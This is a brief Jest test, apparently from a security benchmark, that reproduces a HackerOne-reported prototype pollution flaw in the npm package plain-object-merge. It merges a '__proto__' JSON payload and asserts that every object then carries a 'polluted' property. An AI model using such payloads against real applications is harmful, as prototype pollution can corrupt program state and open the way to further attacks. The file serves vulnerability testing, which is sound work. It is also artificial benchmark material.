//https://hackerone.com/reports/871156
test("prototype pollution in plain-object-merge", () => {
  const merge = require("plain-object-merge");
  const payload = JSON.parse(process.env.SECBENCH_PAYLOAD || process.env.SECBENCH_PAYLOAD || '{"__proto__":{"polluted":"yes"}}');

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge([{}, payload]);
  expect({}.polluted).toBe("yes");
});
